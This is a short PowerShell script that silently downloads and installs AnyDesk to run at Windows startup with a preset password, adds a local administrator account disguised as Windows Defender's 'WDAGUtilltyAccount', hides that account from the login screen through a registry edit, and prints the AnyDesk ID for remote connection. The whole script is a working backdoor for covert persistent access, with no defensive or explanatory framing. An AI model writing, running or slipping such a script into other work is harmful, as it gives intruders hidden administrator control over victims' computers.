Function OpenSeating { 
    #CHANGETHISPASSWD twice
    
    #Download AnyDesk
    mkdir "C:\ProgramData\AnyDesk"  
    $client = new-object System.Net.WebClient 
    $url = "http://download.anydesk.com/AnyDesk.exe" 
    $file = "C:\ProgramData\AnyDesk.exe" 
    $client.DownloadFile($url,$file)
    
    #Install and set passwd
    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent 
    cmd.exe /c echo CHANGETHISPASSWD | C:\ProgramData\anydesk.exe --set-password 
    
    #WinDefender LL admin user
    net user WDAGUtilltyAccount "CHANGETHISPASSWD" /add 
    net localgroup Administrators WDAGUtilltyAccount /ADD 
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v WDAGUtilltyAccount /t REG_DWORD /d 0 /f 
    
    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id 
    } 
 
    OpenSeating
    
